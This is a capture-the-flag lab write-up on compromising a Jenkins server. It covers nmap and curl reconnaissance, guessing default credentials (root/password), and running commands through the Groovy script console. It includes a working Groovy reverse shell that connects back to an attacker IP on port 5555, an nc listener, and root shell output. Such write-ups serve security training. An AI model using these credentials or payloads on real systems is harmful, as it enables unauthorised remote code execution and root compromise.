## 1. Questions
- Task 1
	- What does the acronym CVE stand for?
		- `Common Vulnerabilities and Exposures`
- Task 2
	- What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?
		- `Confidentiality, Integrity, Availability`
- Task 3
	- What is the version of the service running on port 8080?
		- `Jetty 9.4.39.v20210325`
- Task 4
	- What version of Jenkins is running on the target?
		- `2.289.1`
- Task 5
	- What type of script is accepted as input on the Jenkins Script Console?
		- `Groovy`
- Task 6
	- What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?
		- `cmd.exe`
- Task 7
	- What is a different command than "ip a" we could use to display our network interfaces' information on Linux?
		- `ifconfig`
- Task 8
	- What switch should we use with netcat for it to use UDP transport mode?
		- `-u`
- Task 9
	- What is the term used to describe making a target host initiate a connection back to the attacker host?
		- `reverse shell`
- Submit Flag
	- Submit root flag
## 2. Tools
- Linux
- CLI
- nmap
- curl
- Jenkins
- id
- ls
- cat
- Groovy
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -p- -T4 10.129.92.121
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-p-` - Scan all ports
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
<snip>
```
### Test connection to the web server
```bash
curl -i http://10.129.92.121:8080
```
- Key Result Elements
	- `HTTP/1.1 403 Forbidden`
	- `X-Hudson: 1.395`
	- `X-Jenkins: 2.289.1`
	- `Server: Jetty(9.4.39.v20210325)`
	- `<meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script>`
### Test redirect connection to the web server
#### Curl
```bash
curl -i http://10.129.92.121:8080/login?from=%2F
```
- Key Result Elements
	- `HTTP/1.1 200 OK`
	- `X-Hudson: 1.395`
	- `X-Jenkins: 2.289.1`
	- `Server: Jetty(9.4.39.v20210325)`
	- `<input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" class="normal" autocapitalize="off" aria-label="Username">`
	- `<input name="j_password" placeholder="Password" type="password" class="normal" aria-label="Password">`
	- `<input name="from" type="hidden" value="/">`
#### Browser
![](../Assets/Screenshot%202025-09-16%20at%2017.23.11.png)
### Research common Jenkins login credentials
- https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins
### Research other common admin credentials
- Usernames
	- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=Try%20the%20following%20usernames%20%2D%20%E2%80%9Cadmin,%E2%80%9Ctesting%E2%80%9D%20and%20similar%20names.
- Passwords
	- https://outpost24.com/blog/it-admins-weak-password-use/#:~:text=The%20top%2020%20administrator%20passwords
	- https://www.thehacker.recipes/web/config/default-credentials
	- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=If%20a-,default%20password,-can%E2%80%99t%20be%20found
### Test Jenkins login
- Test credentials
	- Usernames
		- `admin`
		- `administrator`
		- `root`
		- `system`
		- `guest`
		- `operator`
		- `super`
	- Passwords
		-  `admin`
		- `Password`
		- `password`
		- `admin123`
		- `root`
- Successfully logged in using username `root` and password `password`
### Explore Jenkins dashboard
- Key elements
	- Signed in as `Administrator`
	- `Groovy Script` build
![](../Assets/Screenshot%202025-09-16%20at%2017.37.19.png)
### Test access to Jenkins script console
- Resource
	- https://www.jenkins.io/doc/book/managing/script-console/
- Result
![](../Assets/Screenshot%202025-09-16%20at%2017.42.14.png)
### Research Jenkins Groovy Scripts
- Resources
	- https://www.hackingarticles.in/jenkins-penetration-testing/
	- https://www.hackingarticles.in/jenkins-penetration-testing/#:~:text=of%20the%20script.-,Executing%20Shell%20Commands%20Directly,-There%20are%20cases
- Simple Test Script
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'id'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Test Jenkins Groovy script
- Script successfully ran
![](../Assets/Screenshot%202025-09-16%20at%2017.51.49.png)
### Explore directory contents - using Groovy script
- Flag found in `/root` directory
![](../Assets/Screenshot%202025-09-16%20at%2017.53.26.png)
### Retrieve the flag - using Groovy script
![](../Assets/Screenshot%202025-09-16%20at%2017.54.29.png)
## Alternate Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -p- -T4 10.129.92.121
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-p-` - Scan all ports
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
<snip>
```
### Test connection to the web server
```bash
curl -i http://10.129.92.121:8080
```
- Key Result Elements
	- `HTTP/1.1 403 Forbidden`
	- `X-Hudson: 1.395`
	- `X-Jenkins: 2.289.1`
	- `Server: Jetty(9.4.39.v20210325)`
	- `<meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script>`
### Test redirect connection to the web server
#### Curl
```bash
curl -i http://10.129.92.121:8080/login?from=%2F
```
- Key Result Elements
	- `HTTP/1.1 200 OK`
	- `X-Hudson: 1.395`
	- `X-Jenkins: 2.289.1`
	- `Server: Jetty(9.4.39.v20210325)`
	- `<input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" class="normal" autocapitalize="off" aria-label="Username">`
	- `<input name="j_password" placeholder="Password" type="password" class="normal" aria-label="Password">`
	- `<input name="from" type="hidden" value="/">`
#### Browser
![](../Assets/Screenshot%202025-09-16%20at%2017.23.11.png)
### Research common Jenkins login credentials
- https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins
### Research other common admin credentials
- Usernames
	- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=Try%20the%20following%20usernames%20%2D%20%E2%80%9Cadmin,%E2%80%9Ctesting%E2%80%9D%20and%20similar%20names.
- Passwords
	- https://outpost24.com/blog/it-admins-weak-password-use/#:~:text=The%20top%2020%20administrator%20passwords
	- https://www.thehacker.recipes/web/config/default-credentials
	- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials#:~:text=If%20a-,default%20password,-can%E2%80%99t%20be%20found
### Test Jenkins login
- Test credentials
	- Usernames
		- `admin`
		- `administrator`
		- `root`
		- `system`
		- `guest`
		- `operator`
		- `super`
	- Passwords
		-  `admin`
		- `Password`
		- `password`
		- `admin123`
		- `root`
- Successfully logged in using username `root` and password `password`
### Explore Jenkins dashboard
- Key elements
	- Signed in as `Administrator`
	- `Groovy Script` build
![](../Assets/Screenshot%202025-09-16%20at%2017.37.19.png)
### Test access to Jenkins script console
- Resource
	- https://www.jenkins.io/doc/book/managing/script-console/
- Result
![](../Assets/Screenshot%202025-09-16%20at%2017.42.14.png)
### Research Jenkins Groovy Scripts
- Resources
	- https://www.hackingarticles.in/jenkins-penetration-testing/
	- https://www.hackingarticles.in/jenkins-penetration-testing/#:~:text=been%20successfully%20executed.-,Exploiting%20Manually%20(Reverse%20Shell),-To%20proceed%20with
	- https://www.revshells.com/
- Reverse shell Script
```groovy
String host="10.10.14.85";int port=5555;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Test Jenkins Groovy script
#### Start netcat listener (host)
- Useful resource
	- https://quickref.me/nc.html
```bash
nc -lnvp 5555
```
#### Run Groovy script
![](../Assets/Screenshot%202025-09-17%20at%2011.47.35.png)
#### Check reverse shell connection opened
- Run an arbitrary command
```bash
connect to [10.10.14.85] from (UNKNOWN) [10.129.92.121] 35720
id
uid=0(root) gid=0(root) groups=0(root)
```
### Explore files and directories
- Flag found in `/root` directory
### Retrieve the flag - using Groovy script
```bash
cat /root/flag.txt
```
